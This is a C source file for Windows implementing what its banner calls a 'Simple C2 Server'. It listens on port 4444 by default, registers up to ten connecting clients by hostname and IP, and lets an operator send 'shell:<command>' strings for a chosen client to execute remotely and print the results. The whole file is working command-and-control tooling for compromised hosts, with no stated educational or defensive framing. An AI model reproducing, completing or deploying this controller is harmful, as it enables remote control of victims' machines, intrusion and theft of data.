#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT 4444
#define BUFFER_SIZE 4096
#define MAX_CLIENTS 10

// Structure to keep track of connected clients
typedef struct {
    SOCKET socket;
    char hostname[64];
    char ip[16];
    int port;
    BOOL active;
} ClientInfo;

ClientInfo clients[MAX_CLIENTS];
int clientCount = 0;

// Function to initialize client array
void initClients() {
    for (int i = 0; i < MAX_CLIENTS; i++) {
        clients[i].socket = INVALID_SOCKET;
        clients[i].hostname[0] = '\0';
        clients[i].ip[0] = '\0';
        clients[i].port = 0;
        clients[i].active = FALSE;
    }
}

// Function to add a client to the array
int addClient(SOCKET socket, const char* ip, int port) {
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!clients[i].active) {
            clients[i].socket = socket;
            strncpy(clients[i].ip, ip, sizeof(clients[i].ip) - 1);
            clients[i].port = port;
            clients[i].active = TRUE;
            
            // Extract hostname from initial data
            char buffer[BUFFER_SIZE] = {0};
            int bytesReceived = recv(socket, buffer, BUFFER_SIZE - 1, 0);
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                
                // Parse hostname from the system info
                char* hostnameStart = strstr(buffer, "Hostname: ");
                if (hostnameStart) {
                    hostnameStart += 10; // Skip "Hostname: "
                    char* hostnameEnd = strchr(hostnameStart, '\n');
                    if (hostnameEnd) {
                        int hostnameLen = hostnameEnd - hostnameStart;
                        if (hostnameLen < sizeof(clients[i].hostname) - 1) {
                            strncpy(clients[i].hostname, hostnameStart, hostnameLen);
                            clients[i].hostname[hostnameLen] = '\0';
                        } else {
                            strncpy(clients[i].hostname, hostnameStart, sizeof(clients[i].hostname) - 1);
                            clients[i].hostname[sizeof(clients[i].hostname) - 1] = '\0';
                        }
                    }
                }
                
                printf("\n[+] Received system info from %s:\n%s\n", clients[i].ip, buffer);
            }
            
            clientCount++;
            return i;
        }
    }
    return -1;
}

// Function to remove a client from the array
void removeClient(int index) {
    if (index >= 0 && index < MAX_CLIENTS && clients[index].active) {
        closesocket(clients[index].socket);
        clients[index].socket = INVALID_SOCKET;
        clients[index].active = FALSE;
        clientCount--;
        printf("[!] Client %s (%s:%d) disconnected\n", 
               clients[index].hostname[0] ? clients[index].hostname : "Unknown",
               clients[index].ip,
               clients[index].port);
    }
}

// Function to interact with a specific client
void interactWithClient(int clientIndex) {
    if (!clients[clientIndex].active) {
        printf("[!] Client is not connected\n");
        return;
    }
    
    char command[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    SOCKET clientSocket = clients[clientIndex].socket;
    
    printf("\n[*] Interacting with client %d (%s - %s:%d)\n",
           clientIndex,
           clients[clientIndex].hostname[0] ? clients[clientIndex].hostname : "Unknown",
           clients[clientIndex].ip,
           clients[clientIndex].port);
    
    printf("[*] Available commands:\n");
    printf("    sysinfo - Get system information\n");
    printf("    shell:<command> - Execute shell command\n");
    printf("    exit - Return to main menu\n");
    printf("    quit - Exit client connection\n\n");
    
    while (1) {
        memset(command, 0, BUFFER_SIZE);
        memset(response, 0, BUFFER_SIZE);
        
        // Get command from user
        printf("\n[%s] > ", clients[clientIndex].hostname);
        fgets(command, BUFFER_SIZE, stdin);
        
        // Remove newline character
        command[strcspn(command, "\n")] = 0;
        
        // Exit interaction mode
        if (strcmp(command, "exit") == 0) {
            break;
        }
        
        // Exit client connection
        if (strcmp(command, "quit") == 0) {
            send(clientSocket, "exit", 4, 0);
            removeClient(clientIndex);
            break;
        }
        
        // Send command to client
        if (send(clientSocket, command, strlen(command), 0) == SOCKET_ERROR) {
            printf("[!] Failed to send command: %d\n", WSAGetLastError());
            removeClient(clientIndex);
            break;
        }
        
        // Receive response
        int bytesReceived = recv(clientSocket, response, BUFFER_SIZE - 1, 0);
        if (bytesReceived <= 0) {
            printf("[!] Connection closed or error: %d\n", WSAGetLastError());
            removeClient(clientIndex);
            break;
        }
        
        response[bytesReceived] = '\0';
        printf("\n%s\n", response);
    }
}

// Function to list all connected clients
void listClients() {
    printf("\n[*] Connected clients (%d):\n", clientCount);
    printf("===================================\n");
    
    if (clientCount == 0) {
        printf("No clients connected\n");
    } else {
        printf("ID | Hostname            | IP Address      | Port\n");
        printf("---+---------------------+-----------------+------\n");
        
        for (int i = 0; i < MAX_CLIENTS; i++) {
            if (clients[i].active) {
                printf("%-2d | %-19s | %-15s | %d\n", 
                       i, 
                       clients[i].hostname[0] ? clients[i].hostname : "Unknown",
                       clients[i].ip, 
                       clients[i].port);
            }
        }
    }
    printf("===================================\n");
}

// Function to print help menu
void printHelp() {
    printf("\n[*] C2 Server Commands:\n");
    printf("===================================\n");
    printf("list      - List all connected clients\n");
    printf("interact <id> - Interact with a specific client\n");
    printf("help      - Show this help menu\n");
    printf("exit      - Exit the server\n");
    printf("===================================\n");
}

// Function to handle client connections in a separate thread
DWORD WINAPI clientHandler(LPVOID lpParam) {
    SOCKET listenSocket = (SOCKET)lpParam;
    struct sockaddr_in clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    SOCKET clientSocket;
    
    while (1) {
        clientSocket = accept(listenSocket, (struct sockaddr*)&clientAddr, &clientAddrSize);
        if (clientSocket == INVALID_SOCKET) {
            printf("[!] Accept failed: %d\n", WSAGetLastError());
            continue;
        }
        
        // Get client IP and port
        char clientIP[16];
        strcpy(clientIP, inet_ntoa(clientAddr.sin_addr));
        int clientPort = ntohs(clientAddr.sin_port);
        
        // Add client to the array
        int clientIndex = addClient(clientSocket, clientIP, clientPort);
        if (clientIndex >= 0) {
            printf("\n[+] New client connected: %s:%d (ID: %d)\n", clientIP, clientPort, clientIndex);
        } else {
            printf("\n[!] Failed to add client: %s:%d (Max clients reached)\n", clientIP, clientPort);
            closesocket(clientSocket);
        }
        
        printf("[C2] > ");
        fflush(stdout);
    }
    
    return 0;
}

int main(int argc, char* argv[]) {
    WSADATA wsaData;
    SOCKET listenSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    int port = DEFAULT_PORT;
    HANDLE clientHandlerThread;
    
    // Parse command line arguments
    if (argc >= 2) {
        port = atoi(argv[1]);
    }
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[!] WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }
    
    // Create socket
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        printf("[!] Failed to create socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    
    // Setup server address structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    
    // Bind socket
    if (bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("[!] Bind failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    
    // Listen for incoming connections
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        printf("[!] Listen failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    
    // Initialize client array
    initClients();
    
    // Start client handler thread
    clientHandlerThread = CreateThread(NULL, 0, clientHandler, (LPVOID)listenSocket, 0, NULL);
    if (clientHandlerThread == NULL) {
        printf("[!] Failed to create client handler thread: %d\n", GetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    
    // Print banner
    printf("\n");
    printf(" ______     ___     ______                              \n");
    printf("|      |   |   |   |      |                             \n");
    printf("|  _   |   |   |   |  _   |   ______   _____   _____   \n");
    printf("| | |  |   |   |   | | |  |  |______| |     | |     |  \n");
    printf("| |_|  |   |   |   | |_|  |   ______  |  ___| |  ___|  \n");
    printf("|     _|   |   |   |     _|  |      | | |     | |      \n");
    printf("|    |_    |   |   |    |_   |  ____| | |___  | |___   \n");
    printf("|_____||   |___|   |_____||  |______| |_____| |_____|  \n");
    printf("\n");
    printf("         Simple C2 Server - Listening on port %d\n", port);
    printf("\n");
    
    // Print help
    printHelp();
    
    // Main command loop
    char command[BUFFER_SIZE];
    while (1) {
        printf("[C2] > ");
        fgets(command, BUFFER_SIZE, stdin);
        command[strcspn(command, "\n")] = 0; // Remove newline
        
        // Process command
        if (strcmp(command, "list") == 0) {
            listClients();
        }
        else if (strncmp(command, "interact ", 9) == 0) {
            int clientId = atoi(command + 9);
            if (clientId >= 0 && clientId < MAX_CLIENTS && clients[clientId].active) {
                interactWithClient(clientId);
            } else {
                printf("[!] Invalid client ID\n");
            }
        }
        else if (strcmp(command, "help") == 0) {
            printHelp();
        }
        else if (strcmp(command, "exit") == 0) {
            printf("[*] Exiting...\n");
            break;
        }
        else if (strlen(command) > 0) {
            printf("[!] Unknown command. Type 'help' for available commands.\n");
        }
    }
    
    // Cleanup
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active) {
            closesocket(clients[i].socket);
        }
    }
    
    closesocket(listenSocket);
    WSACleanup();
    TerminateThread(clientHandlerThread, 0);
    CloseHandle(clientHandlerThread);
    
    return 0;
}